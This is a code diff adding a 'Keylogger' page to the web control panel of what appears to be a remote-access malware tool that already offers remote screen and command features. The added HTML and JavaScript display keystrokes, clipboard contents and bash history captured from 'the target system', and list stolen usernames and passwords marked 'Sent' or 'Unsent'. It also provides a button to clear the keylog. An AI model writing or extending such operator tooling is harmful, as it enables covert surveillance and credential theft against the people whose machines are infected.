@@ -582,6 +582,7 @@
         <a class="nav-item" onclick="showSection('logs')">Logs</a>
         <a class="nav-item" onclick="showSection('screen')">Remote Screen</a>
         <a class="nav-item" onclick="showSection('commands')">Commands</a>
+        <a class="nav-item" onclick="showSection('keylogger')">Keylogger</a>
         <a class="nav-item" onclick="showSection('system')">System</a>
         <a class="nav-item" onclick="showSection('settings')">Settings</a>
         <a class="nav-item" href="/logout" style="margin-top: 30px;">Logout</a>
@@ -793,6 +794,70 @@
             </div>
         </div>
         
+        <!-- Keylogger Section -->
+        <div id="keylogger" class="section">
+            <div class="header">
+                <h1>Keylogger</h1>
+                <div>
+                    <button class="btn btn-secondary" onclick="refreshKeylog()">Refresh</button>
+                    <button class="btn btn-danger" onclick="clearKeylog()">Clear</button>
+                </div>
+            </div>
+            
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="number" id="keylogCharCount">0</div>
+                    <div class="label">Total Characters</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number" id="keylogEntryCount">0</div>
+                    <div class="label">Entries</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number" id="clipboardCount">0</div>
+                    <div class="label">Clipboard Captures</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number" id="credentialCount">0</div>
+                    <div class="label">Credentials</div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <div class="form-row" style="margin-bottom: 15px;">
+                    <select id="keylogFilter" onchange="filterKeylog()">
+                        <option value="all">All Entries</option>
+                        <option value="keyboard">Keyboard Only</option>
+                        <option value="clipboard">Clipboard Only</option>
+                        <option value="bash_history">Bash History Only</option>
+                    </select>
+                    <button class="btn btn-secondary" onclick="toggleRawView()">Toggle Raw View</button>
+                </div>
+                
+                <div id="keylogEntries" style="max-height: 400px; overflow-y: auto;">
+                    <!-- Keylog entries will be loaded here -->
+                </div>
+                
+                <div id="keylogRaw" class="log-preview" style="display: none; margin-top: 15px; max-height: 300px;"></div>
+            </div>
+            
+            <div class="card">
+                <h3>Captured Credentials</h3>
+                <table id="credentialsTable">
+                    <thead>
+                        <tr>
+                            <th>Source</th>
+                            <th>Username/Email</th>
+                            <th>Password</th>
+                            <th>Captured</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody></tbody>
+                </table>
+            </div>
+        </div>
+        
         <!-- System Section -->
         <div id="system" class="section">
             <div class="header">
@@ -867,6 +932,7 @@
             if (sectionId === 'logs') loadLogs();
             if (sectionId === 'screen') loadScreenInfo();
             if (sectionId === 'commands') loadCommands();
+            if (sectionId === 'keylogger') loadKeylogger();
             if (sectionId === 'system') loadSystemInfo();
         }
         
@@ -1498,6 +1564,152 @@
         document.getElementById('logModal').addEventListener('click', (e) => {
             if (e.target.id === 'logModal') closeModal();
         });
+        
+        // Keylogger Functions
+        async function loadKeylogger() {
+            try {
+                const [keylogRes, credsRes] = await Promise.all([
+                    fetch('/api/keylog'),
+                    fetch('/api/credentials')
+                ]);
+                
+                const keylog = await keylogRes.json();
+                const credentials = await credsRes.json();
+                
+                // Update stats
+                document.getElementById('keylogCharCount').textContent = keylog.total_chars || 0;
+                document.getElementById('keylogEntryCount').textContent = keylog.entries?.length || 0;
+                document.getElementById('clipboardCount').textContent = (keylog.entries?.filter(e => e.source === 'clipboard').length || 0);
+                document.getElementById('credentialCount').textContent = credentials.length;
+                
+                // Display entries
+                displayKeylogEntries(keylog.entries || []);
+                
+                // Display credentials
+                displayCredentials(credentials);
+                
+            } catch (error) {
+                console.error('Error loading keylogger:', error);
+            }
+        }
+        
+        function displayKeylogEntries(entries) {
+            const container = document.getElementById('keylogEntries');
+            const filter = document.getElementById('keylogFilter').value;
+            
+            if (entries.length === 0) {
+                container.innerHTML = '<p style="color: #757575; text-align: center; padding: 20px;">No keylog entries yet. Start typing on the target system.</p>';
+                return;
+            }
+            
+            // Filter entries
+            const filtered = filter === 'all' ? entries : entries.filter(e => e.source === filter);
+            
+            container.innerHTML = filtered.slice(-50).reverse().map(entry => {
+                let typeBadge = '';
+                if (entry.source === 'clipboard') {
+                    typeBadge = '<span class="badge" style="background: #fff3e0; color: #e65100;">📋 Clipboard</span>';
+                } else if (entry.source === 'bash_history') {
+                    typeBadge = '<span class="badge" style="background: #e3f2fd; color: #1565c0;">📝 Bash</span>';
+                } else {
+                    typeBadge = '<span class="badge" style="background: #f3e5f5; color: #7b1fa2;">⌨️ Keyboard</span>';
+                }
+                
+                const textPreview = entry.text?.substring(0, 100) || '(empty)';
+                const timestamp = entry.timestamp || 'Unknown';
+                
+                return `
+                    <div style="padding: 12px; border-bottom: 1px solid #e0e0e0; ${entry.source === 'clipboard' || entry.source === 'bash_history' ? 'background: #fafafa;' : ''}">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                            <div>
+                                ${typeBadge}
+                                <span style="color: #757575; font-size: 12px; margin-left: 8px;">${timestamp}</span>
+                            </div>
+                            <button class="btn btn-secondary" style="padding: 4px 8px; font-size: 11px;" onclick="viewKeylogEntry(\`${textPreview.replace(/"/g, '&quot;')}\`)">View</button>
+                        </div>
+                        <div style="font-family: monospace; font-size: 12px; color: #333; word-break: break-all;">${escapeHtml(textPreview)}${entry.text?.length > 100 ? '...' : ''}</div>
+                    </div>
+                `;
+            }).join('');
+        }
+        
+        function displayCredentials(credentials) {
+            const tbody = document.querySelector('#credentialsTable tbody');
+            
+            if (credentials.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #757575; padding: 20px;">No credentials captured yet</td></tr>';
+                return;
+            }
+            
+            tbody.innerHTML = credentials.map(c => `
+                <tr>
+                    <td>${escapeHtml(c.source || 'unknown')}</td>
+                    <td>${escapeHtml(c.username || '-')}</td>
+                    <td style="font-family: monospace;">${escapeHtml(c.password || '-')}</td>
+                    <td>${new Date(c.captured_at).toLocaleString()}</td>
+                    <td><span class="badge ${c.sent ? 'badge-success' : 'badge-danger'}">${c.sent ? 'Sent' : 'Unsent'}</span></td>
+                </tr>
+            `).join('');
+        }
+        
+        function filterKeylog() {
+            loadKeylogger();
+        }
+        
+        function refreshKeylog() {
+            loadKeylogger();
+        }
+        
+        async function clearKeylog() {
+            if (!confirm('Clear all keylog entries?')) return;
+            
+            try {
+                // Clear the keylog file
+                const response = await fetch('/api/keylog/clear', { method: 'POST' });
+                const data = await response.json();
+                
+                if (data.success) {
+                    loadKeylogger();
+                }
+            } catch (error) {
+                console.error('Error clearing keylog:', error);
+            }
+        }
+        
+        function toggleRawView() {
+            const raw = document.getElementById('keylogRaw');
+            const entries = document.getElementById('keylogEntries');
+            
+            if (raw.style.display === 'none') {
+                raw.style.display = 'block';
+                entries.style.display = 'none';
+                loadRawKeylog();
+            } else {
+                raw.style.display = 'none';
+                entries.style.display = 'block';
+            }
+        }
+        
+        async function loadRawKeylog() {
+            try {
+                const response = await fetch('/api/keylog');
+                const data = await response.json();
+                document.getElementById('keylogRaw').textContent = data.raw || 'No data';
+            } catch (error) {
+                console.error('Error loading raw keylog:', error);
+            }
+        }
+        
+        function viewKeylogEntry(text) {
+            document.getElementById('logDetail').textContent = text;
+            document.getElementById('logModal').classList.add('active');
+        }
+        
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
     </script>
 </body>
 </html>
